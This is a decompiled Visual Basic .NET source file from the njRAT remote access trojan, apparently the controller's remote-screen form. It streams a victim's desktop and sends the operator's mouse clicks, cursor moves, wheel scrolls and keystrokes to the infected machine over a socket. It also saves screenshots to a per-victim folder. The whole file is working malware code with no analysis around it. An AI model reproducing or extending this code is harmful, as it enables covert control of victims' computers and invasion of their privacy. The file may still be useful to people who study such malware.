Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000020 RID: 32
	<DesignerGenerated()>
	Public Partial Class sc
		Inherits Form

		' Token: 0x0600043F RID: 1087 RVA: 0x000239A8 File Offset: 0x00021BA8
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = sc.__ENCList
			SyncLock _ENCList
				If sc.__ENCList.Count = sc.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = sc.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = sc.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								sc.__ENCList(num) = sc.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					sc.__ENCList.RemoveRange(num, sc.__ENCList.Count - num)
					sc.__ENCList.Capacity = sc.__ENCList.Count
				End If
				sc.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000180 RID: 384
		' (get) Token: 0x06000442 RID: 1090 RVA: 0x00024214 File Offset: 0x00022414
		' (set) Token: 0x06000443 RID: 1091 RVA: 0x00003396 File Offset: 0x00001596
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x17000181 RID: 385
		' (get) Token: 0x06000444 RID: 1092 RVA: 0x0002422C File Offset: 0x0002242C
		' (set) Token: 0x06000445 RID: 1093 RVA: 0x0000339F File Offset: 0x0000159F
		Friend Overridable Property CheckBox1 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox1 = value
			End Set
		End Property

		' Token: 0x17000182 RID: 386
		' (get) Token: 0x06000446 RID: 1094 RVA: 0x00024244 File Offset: 0x00022444
		' (set) Token: 0x06000447 RID: 1095 RVA: 0x0002425C File Offset: 0x0002245C
		Friend Overridable Property CheckBox2 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox2_CheckedChanged
				If Me._CheckBox2 IsNot Nothing Then
					RemoveHandler Me._CheckBox2.CheckedChanged, value2
				End If
				Me._CheckBox2 = value
				If Me._CheckBox2 IsNot Nothing Then
					AddHandler Me._CheckBox2.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000183 RID: 387
		' (get) Token: 0x06000448 RID: 1096 RVA: 0x000242B4 File Offset: 0x000224B4
		' (set) Token: 0x06000449 RID: 1097 RVA: 0x000242CC File Offset: 0x000224CC
		Friend Overridable Property CheckBox3 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox3_CheckedChanged
				If Me._CheckBox3 IsNot Nothing Then
					RemoveHandler Me._CheckBox3.CheckedChanged, value2
				End If
				Me._CheckBox3 = value
				If Me._CheckBox3 IsNot Nothing Then
					AddHandler Me._CheckBox3.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000184 RID: 388
		' (get) Token: 0x0600044A RID: 1098 RVA: 0x00024324 File Offset: 0x00022524
		' (set) Token: 0x0600044B RID: 1099 RVA: 0x000033A8 File Offset: 0x000015A8
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x17000185 RID: 389
		' (get) Token: 0x0600044C RID: 1100 RVA: 0x0002433C File Offset: 0x0002253C
		' (set) Token: 0x0600044D RID: 1101 RVA: 0x00024354 File Offset: 0x00022554
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000186 RID: 390
		' (get) Token: 0x0600044E RID: 1102 RVA: 0x000243AC File Offset: 0x000225AC
		' (set) Token: 0x0600044F RID: 1103 RVA: 0x000033B1 File Offset: 0x000015B1
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x17000187 RID: 391
		' (get) Token: 0x06000450 RID: 1104 RVA: 0x000243C4 File Offset: 0x000225C4
		' (set) Token: 0x06000451 RID: 1105 RVA: 0x000243DC File Offset: 0x000225DC
		Friend Overridable Property vmethod_16 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_16
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_16_Tick
				If Me._vmethod_16 IsNot Nothing Then
					RemoveHandler Me._vmethod_16.Tick, value2
				End If
				Me._vmethod_16 = value
				If Me._vmethod_16 IsNot Nothing Then
					AddHandler Me._vmethod_16.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000188 RID: 392
		' (get) Token: 0x06000452 RID: 1106 RVA: 0x00024434 File Offset: 0x00022634
		' (set) Token: 0x06000453 RID: 1107 RVA: 0x0002444C File Offset: 0x0002264C
		Friend Overridable Property vmethod_12 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_12
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_12_Tick
				If Me._vmethod_12 IsNot Nothing Then
					RemoveHandler Me._vmethod_12.Tick, value2
				End If
				Me._vmethod_12 = value
				If Me._vmethod_12 IsNot Nothing Then
					AddHandler Me._vmethod_12.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000189 RID: 393
		' (get) Token: 0x06000454 RID: 1108 RVA: 0x000244A4 File Offset: 0x000226A4
		' (set) Token: 0x06000455 RID: 1109 RVA: 0x000033BA File Offset: 0x000015BA
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x1700018A RID: 394
		' (get) Token: 0x06000456 RID: 1110 RVA: 0x000244BC File Offset: 0x000226BC
		' (set) Token: 0x06000457 RID: 1111 RVA: 0x000244D4 File Offset: 0x000226D4
		Friend Overridable Property p As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._p
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As MouseEventHandler = AddressOf Me.p_MouseWheel
				Dim value3 As MouseEventHandler = AddressOf Me.p_MouseUp
				Dim value4 As MouseEventHandler = AddressOf Me.p_MouseMove
				Dim value5 As EventHandler = AddressOf Me.p_MouseLeave
				Dim value6 As EventHandler = AddressOf Me.p_MouseEnter
				Dim value7 As MouseEventHandler = AddressOf Me.p_MouseDown
				Dim value8 As PaintEventHandler = AddressOf Me.p_Paint
				If Me._p IsNot Nothing Then
					RemoveHandler Me._p.MouseWheel, value2
					RemoveHandler Me._p.MouseUp, value3
					RemoveHandler Me._p.MouseMove, value4
					RemoveHandler Me._p.MouseLeave, value5
					RemoveHandler Me._p.MouseEnter, value6
					RemoveHandler Me._p.MouseDown, value7
					RemoveHandler Me._p.Paint, value8
				End If
				Me._p = value
				If Me._p IsNot Nothing Then
					AddHandler Me._p.MouseWheel, value2
					AddHandler Me._p.MouseUp, value3
					AddHandler Me._p.MouseMove, value4
					AddHandler Me._p.MouseLeave, value5
					AddHandler Me._p.MouseEnter, value6
					AddHandler Me._p.MouseDown, value7
					AddHandler Me._p.Paint, value8
				End If
			End Set
		End Property

		' Token: 0x06000458 RID: 1112 RVA: 0x00024618 File Offset: 0x00022818
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.sc_FormClosing
			AddHandler MyBase.Load, AddressOf Me.sc_Load
			AddHandler MyBase.ResizeBegin, AddressOf Me.sc_ResizeBegin
			AddHandler MyBase.ResizeEnd, AddressOf Me.sc_ResizeEnd
			sc.__ENCAddToList(Me)
			Me.QQ = String.Empty
			Me.Oimg = Nothing
			Me.point_0 = Nothing
			Me.point_1 = Nothing
			Me.co = 0
			Me.Folder = String.Empty
			Me.point_2 = New Point(30, 30)
			Me.IsActive = False
			Me.fps = 0
			Me.int_0 = 0
			Me.dbf = 0L
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000459 RID: 1113 RVA: 0x000246F4 File Offset: 0x000228F4
		Public Sub KDW(sender As Object, e As KeyEventArgs)
			If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
				Me.p.Focus()
				If Me.CheckBox2.Checked Then
					Dim keyCode As Keys = e.KeyCode
					Dim flag As Boolean
					If keyCode <> Keys.Shift Then
						If keyCode <> Keys.ShiftKey Then
							If keyCode <> Keys.LShiftKey Then
								If keyCode <> Keys.RShiftKey Then
									flag = False
									GoTo IL_66
								End If
							End If
						End If
					End If
					flag = True
					IL_66:
					If flag Then
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(16) }))
					Else
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(CInt(e.KeyCode)) }))
					End If
				End If
				e.SuppressKeyPress = True
			End If
		End Sub

		' Token: 0x0600045A RID: 1114 RVA: 0x00024800 File Offset: 0x00022A00
		Public Sub KUP(sender As Object, e As KeyEventArgs)
			If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
				Me.p.Focus()
				If Me.CheckBox2.Checked Then
					Dim keyCode As Keys = e.KeyCode
					Dim flag As Boolean
					If keyCode <> Keys.Shift Then
						If keyCode <> Keys.ShiftKey Then
							If keyCode <> Keys.LShiftKey Then
								If keyCode <> Keys.RShiftKey Then
									flag = False
									GoTo IL_66
								End If
							End If
						End If
					End If
					flag = True
					IL_66:
					If flag Then
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(16) }))
					Else
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(CInt(e.KeyCode)) }))
					End If
				End If
				e.SuppressKeyPress = True
			End If
		End Sub

		' Token: 0x0600045B RID: 1115 RVA: 0x0002490C File Offset: 0x00022B0C
		Private Sub p_MouseDown(sender As Object, e As MouseEventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
				Dim flag As Boolean
				If Me.CheckBox1.Checked Then
					If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
						flag = True
						GoTo IL_3B
					End If
				End If
				flag = False
				IL_3B:
				If flag Then
					Dim point As Point = New Point(CInt(Math.Round(Math.Round(CDbl(e.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(e.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
					Dim value As Integer
					If e.Button = MouseButtons.Left Then
						value = 2
					End If
					If e.Button = MouseButtons.Right Then
						value = 8
					End If
					Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(value) }))
				End If
			End SyncLock
		End Sub

		' Token: 0x0600045C RID: 1116 RVA: 0x000033C3 File Offset: 0x000015C3
		Private Sub p_MouseEnter(sender As Object, e As EventArgs)
			Me.IsActive = True
		End Sub

		' Token: 0x0600045D RID: 1117 RVA: 0x000033CC File Offset: 0x000015CC
		Private Sub p_MouseLeave(sender As Object, e As EventArgs)
			Me.IsActive = False
		End Sub

		' Token: 0x0600045E RID: 1118 RVA: 0x00024A6C File Offset: 0x00022C6C
		Private Sub p_MouseMove(sender As Object, e As MouseEventArgs)
			Me.point_2 = e.Location
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
				If(Not Me.p.Focused And Me.CheckBox2.Checked) Or Me.CheckBox1.Checked Then
					Me.p.Focus()
				End If
			End SyncLock
		End Sub

		' Token: 0x0600045F RID: 1119 RVA: 0x00024AE4 File Offset: 0x00022CE4
		Private Sub p_MouseUp(sender As Object, e As MouseEventArgs)
			Dim flag As Boolean
			If Me.CheckBox1.Checked Then
				If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
					flag = True
					GoTo IL_2C
				End If
			End If
			flag = False
			IL_2C:
			If flag Then
				Dim point As Point = New Point(CInt(Math.Round(Math.Round(CDbl(e.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(e.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
				Dim value As Integer
				If e.Button = MouseButtons.Left Then
					value = 4
				End If
				If e.Button = MouseButtons.Right Then
					value = 16
				End If
				Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(value) }))
			End If
		End Sub

		' Token: 0x06000460 RID: 1120 RVA: 0x00024C08 File Offset: 0x00022E08
		Private Sub p_MouseWheel(sender As Object, e As MouseEventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
				Dim flag As Boolean
				If Me.CheckBox1.Checked Then
					If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
						flag = True
						GoTo IL_3B
					End If
				End If
				flag = False
				IL_3B:
				If flag Then
					Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(e.Delta), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(2048) }))
				End If
			End SyncLock
		End Sub

		' Token: 0x06000461 RID: 1121 RVA: 0x00024CD4 File Offset: 0x00022ED4
		Private Sub p_Paint(sender As Object, e As PaintEventArgs)
			Dim text As String = Conversions.ToString(Me.int_0) + "fps" & vbCrLf + Class6.smethod_17(Me.pkt)
			Dim size As Size = TextRenderer.MeasureText(text, New Font(Me.Font, FontStyle.Bold))
			If Not(Me.point_2.X < size.Width And Me.point_2.Y < size.Height) Then
				Dim rect As Rectangle = New Rectangle(0, 0, size.Width, size.Height)
				e.Graphics.FillRectangle(New Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rect)
				Dim brush As Brush = Brushes.White
				If Me.int_0 > 3 Then
					brush = Brushes.YellowGreen
				End If
				If Me.int_0 > 6 Then
					brush = Brushes.LimeGreen
				End If
				e.Graphics.DrawString(text, New Font(Me.Font, FontStyle.Bold), brush, 0F, 0F)
			End If
		End Sub

		' Token: 0x06000462 RID: 1122 RVA: 0x00024DC8 File Offset: 0x00022FC8
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Button1.Text, "Stop", False) = 0 Then
				Me.Button1.Text = "Start"
				Me.sk.Send("!!")
				Me.ComboBox1.Enabled = True
			Else
				Me.ComboBox1.Enabled = False
				Me.Button1.Text = "Stop"
				Dim num As Single = CSng((Conversions.ToDouble(Me.ComboBox1.Text.Remove(0, 1)) / 100.0))
				Dim size As Size = New Size(CInt(Math.Round(Math.Round(CDbl((CSng(Me.sz.Width) * num / 10F))))) * 10, CInt(Math.Round(Math.Round(CDbl((CSng(Me.sz.Height) * num / 10F))))) * 10)
				Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Me.sk.ip(), Class7.string_1, Conversions.ToString(size.Width), "x", Conversions.ToString(size.Height), Class7.string_1, "0" }))
			End If
		End Sub

		' Token: 0x06000463 RID: 1123 RVA: 0x00024F24 File Offset: 0x00023124
		Private Sub vmethod_16_Tick(sender As Object, e As EventArgs)
			Me.vmethod_12.Enabled = False
			If Not Me.osk.CN Or Not Me.sk.CN Then
				Me.sk.CN = False
				Me.Panel1.Enabled = False
				Me.Text = "Disconnected!! " + Me.QQ
				Me.Close()
			Else
				Me.int_0 = Me.fps
				Me.fps = 0
				If Me.int_0 = 0 Then
					Me.pkt = 0L
					Me.p.Invalidate()
				End If
				Me.vmethod_12.Enabled = True
			End If
		End Sub

		' Token: 0x06000464 RID: 1124 RVA: 0x00002A6F File Offset: 0x00000C6F
		Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000465 RID: 1125 RVA: 0x00024FD8 File Offset: 0x000231D8
		Private Sub vmethod_12_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar1.Value = Me.sk.rp()
			Dim point As Point = Me.PointToClient(Cursor.Position)
			If point.X > -1 And point.Y > -1 And Me.IsActive Then
				Me.point_0 = New Point(CInt(Math.Round(Math.Round(CDbl(point.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(point.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
				If(Me.CheckBox1.Checked And Operators.CompareString(Me.Button1.Text, "Start", False) <> 0) AndAlso Me.point_0 <> Me.point_1 Then
					Me.point_1 = Me.point_0
					Dim client As Client = Me.sk
					Dim text As String = String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(Me.point_1.X), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(1) })
					client.SEND_(Class6.smethod_11(text))
				End If
			End If
		End Sub

		' Token: 0x06000466 RID: 1126 RVA: 0x000033D5 File Offset: 0x000015D5
		Private Sub sc_FormClosing(sender As Object, e As FormClosingEventArgs)
			If Me.sk IsNot Nothing Then
				Me.sk.CN = False
			End If
		End Sub

		' Token: 0x06000467 RID: 1127 RVA: 0x00025150 File Offset: 0x00023350
		Private Sub sc_Load(sender As Object, e As EventArgs)
			Try
				Dim p As PictureBox = Me.p
				Dim obj As PictureBox = p
				SyncLock obj
					Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
					Me.Text = Me.QQ
					Dim p2 As Control = Me.p
					AddHandler p2.KeyUp, AddressOf Me.KUP
					AddHandler p2.KeyDown, AddressOf Me.KDW
					Me.ComboBox1.SelectedIndex = Conversions.ToInteger(Class7.class8_0.string_0)
				End SyncLock
				Me.Folder = Me.osk.Folder + "Screen\"
				If Not Directory.Exists(Me.Folder) Then
					Directory.CreateDirectory(Me.Folder)
				End If
				If Class7.class8_0.bool_6 Then
					Me.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
				End If
			Catch ex As Exception
				Me.Close()
			End Try
		End Sub

		' Token: 0x06000468 RID: 1128 RVA: 0x00025278 File Offset: 0x00023478
		Private Sub sc_ResizeBegin(sender As Object, e As EventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
			End SyncLock
		End Sub

		' Token: 0x06000469 RID: 1129 RVA: 0x00025278 File Offset: 0x00023478
		Private Sub sc_ResizeEnd(sender As Object, e As EventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
			End SyncLock
		End Sub

		' Token: 0x0600046A RID: 1130 RVA: 0x000252B0 File Offset: 0x000234B0
		Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CheckBox3.Checked Then
				Try
					Process.Start(Me.Folder)
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x040001FC RID: 508
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001FE RID: 510
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x040001FF RID: 511
		<AccessedThroughProperty("CheckBox1")>
		Private _CheckBox1 As CheckBox

		' Token: 0x04000200 RID: 512
		<AccessedThroughProperty("CheckBox2")>
		Private _CheckBox2 As CheckBox

		' Token: 0x04000201 RID: 513
		<AccessedThroughProperty("CheckBox3")>
		Private _CheckBox3 As CheckBox

		' Token: 0x04000202 RID: 514
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x04000203 RID: 515
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000204 RID: 516
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000205 RID: 517
		<AccessedThroughProperty("vmethod_16")>
		Private _vmethod_16 As Timer

		' Token: 0x04000206 RID: 518
		<AccessedThroughProperty("vmethod_12")>
		Private _vmethod_12 As Timer

		' Token: 0x04000207 RID: 519
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x04000208 RID: 520
		<AccessedThroughProperty("p")>
		Private _p As PictureBox

		' Token: 0x04000209 RID: 521
		Public co As Integer

		' Token: 0x0400020A RID: 522
		Public dbf As Long

		' Token: 0x0400020B RID: 523
		Public Folder As String

		' Token: 0x0400020C RID: 524
		Public fps As Integer

		' Token: 0x0400020D RID: 525
		Private int_0 As Integer

		' Token: 0x0400020E RID: 526
		Public IsActive As Boolean

		' Token: 0x0400020F RID: 527
		Public Oimg As Bitmap

		' Token: 0x04000210 RID: 528
		Public osk As Client

		' Token: 0x04000211 RID: 529
		Public pkt As Long

		' Token: 0x04000212 RID: 530
		Private point_0 As Point

		' Token: 0x04000213 RID: 531
		Private point_1 As Point

		' Token: 0x04000214 RID: 532
		Private point_2 As Point

		' Token: 0x04000215 RID: 533
		Public QQ As String

		' Token: 0x04000216 RID: 534
		Public sk As Client

		' Token: 0x04000217 RID: 535
		Public sz As Size
	End Class
End Namespace
